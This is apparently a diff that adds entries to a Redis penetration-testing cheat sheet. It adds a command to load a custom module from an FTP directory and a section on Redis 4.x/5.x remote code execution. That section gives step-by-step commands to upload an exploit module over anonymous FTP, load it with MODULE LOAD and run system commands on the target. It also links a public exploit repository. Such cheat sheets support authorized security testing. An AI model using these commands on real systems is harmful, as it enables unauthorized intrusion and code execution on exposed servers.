@@ -67,6 +67,8 @@ SAVE
 CONFIG GET dir
 #Get the database filename
 CONFIG GET dbfilename
+#Load a custom module
+MODULE LOAD /var/ftp/pub/exp.so
 
 ## File Read/Write Operations for Exploitation Redis Commands
 #Connect to Redis server (default: localhost, port 6379)
@@ -125,6 +127,21 @@ PUBLISH <channel> <message></message></channel>
 SUBSCRIBE <channel></channel>
 #Get the length of a string value
 STRLEN <key></key>
+
+## If the server appears vulnerable to Redis4.x/5.x RCE but the public exploits don't work, attempt to
+## upload the exp.so file and manually execute it using "MODULE LOAD /var/ftp/filename". 
+## Or use a different exp.so exploit module, for example exp_lin.so, which can be found here https://github.com/jas502n/Redis-RCE.
+## *Requirements Redis access + another way to add files to the target server ie ftp
+## *Steps below are assuming "ftp access in terminal 1" is used to add a file and "redis-cli  terminal 2" to load the module
+## 
+## ftpTerminal> ftp anonymous@target.com
+## ftpTerminal> put exp_lin.so
+##
+## redisTerminal> redis-cli -h target.com -p 6379
+## redisTerminal> MODULE LOAD /var/ftp/pub/exp_lin.so
+## redisTerminal> system.exec "id"
+##
+##############
 
 
 ## Use Metasploit Modules ##
